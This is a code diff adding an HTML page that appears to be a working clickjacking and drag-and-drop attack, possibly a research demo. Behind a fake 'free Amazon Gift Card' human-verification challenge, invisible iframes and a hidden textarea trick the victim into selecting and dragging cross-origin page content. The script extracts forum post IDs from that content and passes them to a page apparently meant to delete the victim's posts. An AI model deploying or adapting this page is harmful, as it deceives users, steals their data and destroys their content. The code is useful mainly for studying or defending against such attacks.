@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link href="resources/css/bootstrap.css" rel="stylesheet" media="screen" />
+    <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+    <script type="text/javascript" src="resources/js/bootstrap.min.js"></script>
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="resources/img/logo.ico"
+    />
+    <link rel="stylesheet" href="resources/css/jquery-ui.theme.css" />
+    <script type="text/javascript" src="resources/js/jquery-1.11.0.js"></script>
+    <script type="text/javascript" src="resources/js/jquery-ui.js"></script>
+
+
+    <style>
+      .iframe_hidden {
+        top: 210px;
+        left: 365px;
+        opacity: 0.0;
+        position: absolute;
+        z-index: 3;
+      }
+      .text_area_hidden {
+        height: 100px;
+        width: 100px;
+        top: 200px;
+        left: 670px;
+        opacity: 0.0;
+        position: absolute;
+        z-index: 3;
+      }
+      .ball {
+        top: 200px;
+        left: 350px;
+        position: absolute;
+        z-index: 1;
+      }
+
+      .ball_1 {
+        top: 210px;
+        left: 680px;
+        filter: alpha(opacity=0);
+        opacity: 0;
+        position: absolute;
+        z-index: 1;
+      }
+
+      .Dolphin {
+        top: 120px;
+        left: 730px;
+        position: absolute;
+        z-index: 1;
+      }
+#wrapper {
+      background-color: rgb(20, 20, 20);
+      text-align: center;
+    }
+
+    #centerDiv {
+      color: darkgoldenrod;
+      display: inline-block;
+    }
+    </style>
+
+    <script>
+
+      function Init() {
+        var target = document.getElementById("dropper");
+        target.addEventListener("drop", DumpInfo, false);
+        var outer = document.getElementById("outer");
+        var inner = outer.contentWindow.document.getElementById('inner');
+	      var framCon = inner.contentWindow;
+	      framCon.focus();
+      }
+
+      function DumpInfo(event) {
+        showHide_ball.call(this);
+        showHide_ball_1.call(this);
+        var element = String(document.getElementById("dropper").value);
+        const regexp = /viewtopic\.php\?p=(.+?)#/g;
+        var postId = [];
+        var result;
+        while((result = regexp.exec(element)) !== null) {
+          console.log(result[1]);
+          postId.push(result[1])
+        }
+        var data = '?data=' + postId;
+        window.open("delelePost.html"+data,"_self")
+	return false;
+      }
+
+      function showHide_ball() {
+        var hide_ball = document.getElementById("hide_ball");
+        hide_ball.style.opacity = "0";
+        hide_ball.style.filter = "alpha(opacity=100)";
+      }
+
+      function showHide_ball_1() {
+        var hide_ball_1 = document.getElementById("hide_ball_1");
+        hide_ball_1.style.opacity = "1";
+        hide_ball_1.style.filter = "alpha(opacity=100)";
+      }
+    </script>
+  </head>
+
+  <body onload="Init();" style="background-color:black">
+    <div id="wrapper">
+      <h1 id="centerDiv" style="font-style: initial;"> Get free Amazon Gift Card</h2>
+    </div>
+    <div id="wrapper">
+      <div id="centerDiv" style="font-size:larger;font-style: italic;">Please complete the challange to prove you are human: clicking "Ctrl + a" to select the ball, 	then drag it to the mouth of the dolphin with the mouse
+
+         </div>
+    </div>
+	<h1>  </h1>
+        <iframe
+        id="outer"
+        src="inner.html"
+        width="150px"
+        height="150px"
+        scrolling="no"
+        draggable="false"
+	class="iframe_hidden"
+    >
+    </iframe>
+    <div>
+      <textarea id="dropper" class="text_area_hidden"> </textarea>
+    </div>
+    <img
+      id="hide_ball"
+      src="resources/img/ball.png"
+      width="100"
+      height="100"
+      class="ball"
+    />
+    <img
+      src="resources/img/delfin.png"
+      width="300"
+      height="400"
+      class="Dolphin"
+    />
+    <div>
+      <img
+        id="hide_ball_1"
+        src="resources/img/ball.png"
+        width="100"
+        height="100"
+        class="ball_1"
+      />
+    </div>
+    <div
+      id="info"
+      style="
+        position: absolute;
+        backgroundcolor: #e0e0e0;
+        font-weight: bold;
+        top: 600px;
+      "
+    ></div>
+
+  </body>
+</html>
+
